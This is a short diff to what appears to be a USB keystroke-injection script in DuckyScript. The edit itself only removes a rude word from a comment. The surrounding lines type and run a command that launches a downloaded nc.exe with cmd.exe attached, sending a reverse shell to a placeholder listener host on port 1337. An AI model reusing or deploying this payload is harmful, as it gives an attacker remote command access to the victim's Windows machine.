@@ -18,7 +18,7 @@ ENTER
 DELAY 220
 REM done with that
 REM execute nc.exe with a reverse shell pointed at myself
-REM reverse shell must be listening first dipshit
+REM reverse shell must be listening first
 STRING ./Downloads/nc.exe -e C:\Windows\System32\cmd.exe YOURLISTENINGBOX 1337
 ENTER
 REM thats all folks
